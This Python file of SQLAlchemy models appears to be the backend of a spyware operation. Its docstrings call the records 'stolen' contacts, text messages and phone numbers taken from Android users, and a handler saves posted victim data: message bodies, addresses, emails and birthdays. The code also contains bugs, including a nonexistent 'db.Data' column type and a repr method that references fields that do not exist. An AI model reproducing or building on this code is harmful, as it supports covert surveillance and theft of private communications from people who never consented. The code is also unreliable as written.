from app import db
from app.models import utility


class Contact(db.Model):
    """Models a stolen contact from a user"""
    __tablename__ = "contact"
    contact_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))

    displayNamePrimary = db.Column(db.String(64), nullable=False)
    homeAddress = db.Column(db.String(64), nullable=True)
    email = db.Column(db.String(64), nullable=True)
    organisation = db.Column(db.String(64), nullable=True)
    birthday = db.Column(db.String(64), nullable=True)
    phoneNumbers = db.relationship("PhoneNumber")
    textMessages = db.relationship("TextMessage")

    @staticmethod
    def userdata_post_handler(user_id, contact_data_dict):
        """Adds posted userdata to database"""
        # Create contact
        contact = Contact(
            user_id=int(user_id),
            displayNamePrimary=contact_data_dict.get("displayNamePrimary"),
            homeAddress=contact_data_dict.get("homeAddress"),
            email=contact_data_dict.get("email"),
            organisation=contact_data_dict.get("organisation"),
            birthday=contact_data_dict.get("birthday")
        )
        # Create related text messages
        for message in contact_data_dict.get("textMessages"):
            text_message = TextMessage(
                user_id=contact.user_id,
                contact_id=contact.contact_id,
                android_given_id=message.get("id"),
                # TODO: Might need long to date conversion
                time_stamp=message.get("timeStamp"),
                body=message.get("body"),
                address=message.get("address"),
                inbound=message.get("inbound")
            )
            db.session.add(text_message)

        # Create related phone numbers
        for number in contact_data_dict.get("phoneNumbers"):
            phone_number = PhoneNumber(
                contact_id=contact.contact_id,
                number=number
            )
            db.session.add(phone_number)

        db.session.add(contact)
        db.session.commit()

    def as_dict(self):
        """As sqlalchemy obj cant be parsed to json we build a custom converter"""
        return utility.dict_keys_to_camel_case(
            {c.name: getattr(self, c.name) for c in self.__table__.columns})

    def __repr__(self):
        return "<Contact {}.{} {}>".format(self.contact_id, self.firstname, self.lastname)

class TextMessage(db.Model):
    """Models a stolen textMessage from a user send by a ceratin contact
    This data has no handler as it can not be posted by the app alone
    but only as a field in a contact post"""
    __tablename__ = "text_message"
    textmessage_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))
    contact_id = db.Column(db.Integer, db.ForeignKey("contact.contact_id"))

    # TODO: I dont know whether BigInteger is the same as long
    android_given_id = db.Column(db.BigInteger, nullable=False)
    time_stamp = db.Column(db.Data, nullable=False)
    body = db.Column(db.String(64), nullable=False)
    address = db.Column(db.String(64), nullable=False)
    inbound = db.Column(db.Boolean, default=False)

    def as_dict(self):
        """As sqlalchemy obj cant be parsed to json we build a custom converter"""
        return utility.dict_keys_to_camel_case(
            {c.name: getattr(self, c.name) for c in self.__table__.columns})

    def __repr__(self):
        return "<Textmessage {}.{}: {}>".format(self.textmessage_id, self.time_stamp, self.body)

class PhoneNumber(db.Model):
    """Models a phnenumbers associated with a stolen contact
    This data has no handler as it can not be posted by the app alone
    but only as a field in a contact post"""
    __tablename__ = "phone_number"
    phonenumber_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    contact_id = db.Column(db.Integer, db.ForeignKey("contact.contact_id"))

    number = db.Column(db.String(64), nullable=False)

    def as_dict(self):
        """As sqlalchemy obj cant be parsed to json we build a custom converter"""
        return utility.dict_keys_to_camel_case(
            {c.name: getattr(self, c.name) for c in self.__table__.columns})

    def __repr__(self):
        return "<PhoneNumber {}.{} {}>".format(self.phonenumber_id, self.contact_id, self.number)

spydatatypes = {"contact": Contact}
